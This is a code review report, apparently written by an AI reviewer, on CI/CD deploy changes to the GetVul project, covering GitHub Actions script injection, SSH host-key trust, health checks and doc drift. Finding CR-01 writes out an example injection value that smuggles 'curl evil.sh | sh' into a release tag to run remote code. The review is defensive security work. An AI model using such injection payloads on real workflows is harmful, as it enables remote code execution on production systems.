---
phase: 03-update-path-reconciliation
reviewed: 2026-07-02T07:53:37Z
depth: standard
files_reviewed: 14
files_reviewed_list:
  - .github/workflows/cd.yml
  - docs/02-architecture.md
  - docs/07-project-structure.md
  - docs/12-pipelines-cicd.md
  - docs/13-deployment.md
  - docs/17-troubleshooting.md
  - docs/diagrams/pipelines-cicd.mmd
  - infra/aws/main.tf
  - infra/aws/startup.sh
  - infra/azure/main.tf
  - infra/azure/startup.sh
  - infra/gcp/main.tf
  - infra/gcp/startup.sh
  - install.sh
findings:
  critical: 1
  warning: 5
  info: 4
  total: 10
status: issues_found
---

# Phase 3: Code Review Report

**Reviewed:** 2026-07-02T07:53:37Z
**Depth:** standard
**Files Reviewed:** 14
**Status:** issues_found

## Summary

This phase removed the auto-update cron from provisioning (`install.sh`, all three
`startup.sh` scripts, deleted `scripts/auto-update.sh`) and re-pointed the CD deploy
path at a specific release tag instead of `origin/main`. The cron removal is clean and
consistent across all files. The docs were largely updated to match.

The CD change, however, introduces a **command-injection vulnerability** by switching
the SSH heredoc delimiter from quoted (`'DEPLOY'`) to unquoted (`DEPLOY`) and pasting a
GitHub Actions expression (`${{ env.DEPLOY_TAG }}`) — whose value originates from a free-
text `workflow_dispatch` input — directly into a shell script. This is the classic
GitHub Actions script-injection pattern and is exploitable by anyone who can trigger a
manual dispatch. It must be fixed before this ships. Several correctness/robustness gaps
around the tag-checkout path and one stale-doc defect (troubleshooting D3 still documents
the old, now-removed behavior as a live bug) round out the findings.

## Critical Issues

### CR-01: Command injection via `release_tag` input pasted into unquoted SSH heredoc

**File:** `.github/workflows/cd.yml:45`, `:49`, `:55` (input source `:26`, `:34`)
**Issue:**
The `workflow_dispatch` input `release_tag` is a free-text `type: string` (line 10). Its
value flows unsanitized to:

1. `DEPLOY_TAG="${{ github.event.release.tag_name || inputs.release_tag }}"` (line 26)
2. `echo "DEPLOY_TAG=$DEPLOY_TAG" >> "$GITHUB_ENV"` (line 34)
3. `... << DEPLOY` (unquoted heredoc, line 45) with `git checkout --force "${{ env.DEPLOY_TAG }}"` (line 55) and `echo "=== Deploying GetVul ${{ env.DEPLOY_TAG }} ..."` (line 49).

`${{ env.DEPLOY_TAG }}` is a GitHub Actions **expression**, substituted as raw text into
the `run:` script *before* the shell parses it. Because the heredoc delimiter is now
unquoted, the runner shell also performs `$(...)`, backtick, and `$VAR` expansion on the
body. A dispatch with, for example:

```
release_tag:  v1.0.0"; curl evil.sh | sh; echo "
```

produces on the runner (and forwards to the production VM):

```bash
git checkout --force "v1.0.0"; curl evil.sh | sh; echo ""
```

Both the runner and the production VM execute the injected commands. Additionally, a
newline in `release_tag` injects arbitrary variables into `$GITHUB_ENV` (line 34),
including overriding later step env. Anyone with "Run workflow" permission (or a
compromised PAT/branch) gets **remote code execution on the production VM** and the CD
runner. This is a strict regression: the previous quoted heredoc did not expand the body.

**Fix:**
Do not interpolate untrusted input into the script body. Pass it through the environment
and reference a shell variable (which does not re-expand), and validate the tag format
before use:

```yaml
      - name: Resolve deploy tag
        run: |
          DEPLOY_TAG="${{ github.event.release.tag_name || inputs.release_tag }}"
          if [ -z "$DEPLOY_TAG" ]; then
            echo "ERROR: No deploy tag resolved." >&2
            exit 1
          fi
          # Allowlist: only tag-name-safe characters
          if ! printf '%s' "$DEPLOY_TAG" | grep -Eq '^[A-Za-z0-9._/-]+$'; then
            echo "ERROR: release_tag contains illegal characters: $DEPLOY_TAG" >&2
            exit 1
          fi
          echo "DEPLOY_TAG=$DEPLOY_TAG" >> "$GITHUB_ENV"

      - name: Deploy to VM
        env:
          DEPLOY_TAG: ${{ env.DEPLOY_TAG }}
        run: |
          ssh -i ~/.ssh/deploy_key -o StrictHostKeyChecking=no \
            "${{ env.VM_USER }}@${{ env.VM_HOST }}" \
            "DEPLOY_TAG=$DEPLOY_TAG bash -s" << 'DEPLOY'
            set -e
            cd /opt/getvul
            echo "=== Deploying GetVul ${DEPLOY_TAG} $(date) ==="
            git fetch --tags --force
            # Verify the ref resolves to an actual tag, then check it out
            git rev-parse -q --verify "refs/tags/${DEPLOY_TAG}^{commit}" >/dev/null \
              || { echo "No such tag: ${DEPLOY_TAG}" >&2; exit 1; }
            git checkout --force "refs/tags/${DEPLOY_TAG}"
            docker compose build --no-cache
            docker compose up -d
            ...
          DEPLOY
```

Keeping the heredoc **quoted** (`'DEPLOY'`) and passing `DEPLOY_TAG` as an environment
variable to the remote shell removes both the runner-side and VM-side expansion of
untrusted text. The regex allowlist is defense-in-depth.

## Warnings

### WR-01: `git checkout --force "$DEPLOY_TAG"` will match a branch or commit-ish, not only a release tag

**File:** `.github/workflows/cd.yml:55`
**Issue:**
`git checkout --force "<ref>"` resolves against branches, remote-tracking refs, and
partial SHAs — not just tags. If `release_tag` is set to `main`, `origin/main`, or a raw
SHA, CD silently deploys that instead of a real release tag, reintroducing exactly the
"deploy arbitrary HEAD" behavior PROD-03 set out to remove. The comment on line 54 asserts
"the released tag" but nothing enforces it.
**Fix:** Disambiguate to the tags namespace and verify it exists before checkout:
```bash
git rev-parse -q --verify "refs/tags/${DEPLOY_TAG}^{commit}" >/dev/null \
  || { echo "No such tag: ${DEPLOY_TAG}" >&2; exit 1; }
git checkout --force "refs/tags/${DEPLOY_TAG}"
```

### WR-02: `set -e` inside an SSH heredoc does not fail the CD job on remote error

**File:** `.github/workflows/cd.yml:45-78`
**Issue:**
The remote script runs `set -e` (line 46), but `set -e` only controls the remote shell's
exit. The overall step passes/fails on `ssh`'s exit code. Whether `ssh` propagates the
remote exit code reliably here is fragile: the heredoc is fed on stdin, and any command in
the block that fails but is not the last statement (e.g. `docker compose build` failing)
depends on `set -e` firing *and* ssh forwarding that status. There is no `-o BatchMode`
and no explicit check. A failed build or `docker compose up` can leave the VM
half-deployed while the step may still be interpreted as progressing to the health loop.
The health loop then runs 30×5s = 150s before the final `curl ... || exit 1` catches it —
long, and only catches health, not build failure.
**Fix:** Run the remote body via `ssh ... 'bash -s'` with `set -euo pipefail`, and confirm
the step asserts on the SSH exit status. Consider failing fast on build/up rather than
relying solely on the trailing health curl.

### WR-03: Health-check loop swallows the failure signal; final verify can race

**File:** `.github/workflows/cd.yml:62-72`
**Issue:**
The loop `for i in $(seq 1 30)` breaks on first success but does **not** track whether it
ever succeeded. After the loop, line 72 re-curls `/health` once. If the app is flapping
(healthy during the loop, unhealthy at line 72, or vice-versa) the outcome is inconsistent.
More importantly, if all 30 attempts fail, the loop simply exits and relies entirely on the
single line-72 curl — a redundant/again-flaky probe rather than a definitive "loop never
succeeded → fail" signal.
**Fix:** Track success explicitly and fail deterministically:
```bash
ok=0
for i in $(seq 1 30); do
  if curl -sf http://localhost:8000/health >/dev/null 2>&1; then ok=1; break; fi
  sleep 5
done
[ "$ok" = 1 ] || { echo "health never came up" >&2; exit 1; }
```

### WR-04: `ssh-keyscan` failure is silently ignored, weakening host-key trust

**File:** `.github/workflows/cd.yml:41`
**Issue:**
`ssh-keyscan -H ${{ env.VM_HOST }} >> ~/.ssh/known_hosts 2>/dev/null || true` swallows all
errors, and the deploy step then uses `-o StrictHostKeyChecking=no` (line 45) anyway. The
combination means the runner will connect to whatever host answers on that IP with no host-
key verification — a man-in-the-middle deploying attacker-controlled code to, or harvesting
the deploy key from, a spoofed endpoint. `ssh-keyscan` is trust-on-first-use to begin with;
pairing it with `StrictHostKeyChecking=no` makes it purely decorative.
**Fix:** Store the known host key in a secret and write it to `known_hosts`, then use
`StrictHostKeyChecking=yes` (or `accept-new`). At minimum, drop the `|| true` so a keyscan
failure is visible, and do not combine keyscan with `StrictHostKeyChecking=no`.

### WR-05: Stale/incorrect troubleshooting entry D3 documents the removed behavior as a live bug

**File:** `docs/17-troubleshooting.md:229-235`
**Issue:**
Entry **D3 "CD deploys old code"** still states the *cause* as
`cd.yml does git fetch origin main && git reset --hard origin/main ([cd.yml:40-41])` and
recommends the interim workaround of manually `git checkout v1.2.3`. That code path was
removed in this very phase (replaced by `git fetch --tags --force` + `git checkout <tag>`).
The line references (`cd.yml:40-41`) are also now wrong. An operator reading this during an
incident will be actively misled about how CD behaves. This is the kind of doc drift the
phase was supposed to eliminate (it correctly rewrote B1 but missed D3).
**Fix:** Either delete D3 or rewrite it to describe the tag-pinned behavior — e.g. "CD now
checks out the resolved release tag; if the VM shows old code, confirm the tag was pushed
(`git fetch --tags --force`) and that `DEPLOY_TAG` resolved to the intended tag in the
Actions log."

## Info

### IN-01: `install.sh` step numbering is internally inconsistent

**File:** `install.sh:37`, `:45`, `:50`, `:63`, `:67`, `:71`, `:87`, `:91`
**Issue:**
The banner says "runs 8 steps" in the docs, but `install.sh` labels are mismatched: Step 1
is `[1/5]` (lines 20/32) while later steps use `/6` and `/7` (`[2/6]`, `[3/6]`, `[4/6]`,
`[5/6]`, `[6/7]`, `[7/7]`). The `[1/5]` versus `[x/6]`/`[x/7]` denominators never agree, and
there is no `create_admin` vs `seed` alignment with docs (13-deployment.md says "7 steps",
07-project-structure.md says "7-step", the file header comment is gone). Cosmetic, but the
counters are visibly wrong to any operator watching the install.
**Fix:** Renumber all step labels to a single consistent denominator (there are 7 real
steps now that cron is gone: Docker, TLS, .env, build, health-wait, admin, seed).

### IN-02: `docs/13-deployment.md` still claims "8 steps" / lists 7 with a cron reference removed

**File:** `docs/13-deployment.md:155-163`
**Issue:**
Line 155 says "The install script runs 8 steps automatically" but only 7 are enumerated
(1–7), and item 3 references `NEXT_PUBLIC_API_URL=""` which `install.sh` does not actually
write into `.env` (lines 51-56 of install.sh only write DATABASE_URL, REDIS_URL,
ENVIRONMENT, DEBUG, JWT_SECRET_KEY, ENCRYPTION_KEY). Minor doc/code drift left over from the
cron removal.
**Fix:** Change "8 steps" to "7 steps" and drop the `NEXT_PUBLIC_API_URL=""` claim (or add
it to install.sh if it is actually required).

### IN-03: `install.sh` generates a weak self-signed cert subject and non-Fernet fallback key

**File:** `install.sh:39-42`, `:59`
**Issue:**
Not introduced by this phase, but in scope as a reviewed file. Line 59's fallback
`openssl rand -base64 32` produces a value that is **not** a valid Fernet key (Fernet
requires a 32-byte urlsafe-base64 key, i.e. `base64` of exactly 32 bytes with urlsafe
alphabet and `=` padding — `openssl rand -base64 32` uses the standard alphabet and may
contain `+`/`/`). If `python3`/cryptography is unavailable, the app will fail at runtime
with `InvalidToken`/`ValueError` rather than at install time.
**Fix:** Use `openssl rand -base64 32 | tr '+/' '-_'` as a closer fallback, or hard-fail
the install if a valid Fernet key cannot be produced rather than writing an unusable one.

### IN-04: `docs/diagrams/pipelines-cicd.mmd` node text can imply CI gates CD (it does not)

**File:** `docs/diagrams/pipelines-cicd.mmd:20-28`
**Issue:**
The CD subgraph and the "backend/frontend now hard-fail" note sit adjacent, and CD is
triggered independently by release publish / manual dispatch with **no dependency on CI
passing** (the `force` "skip CI check" input was removed but no CI gate replaced it). The
diagram does not misstate this outright, but a reader may infer CI green is a precondition
for CD. Worth an explicit "CD does not require CI green (see PROD-02 branch protection)"
annotation to avoid a false sense of gating.
**Fix:** Add a one-line note in the CD subgraph clarifying CD has no CI precondition today.

---

_Reviewed: 2026-07-02T07:53:37Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
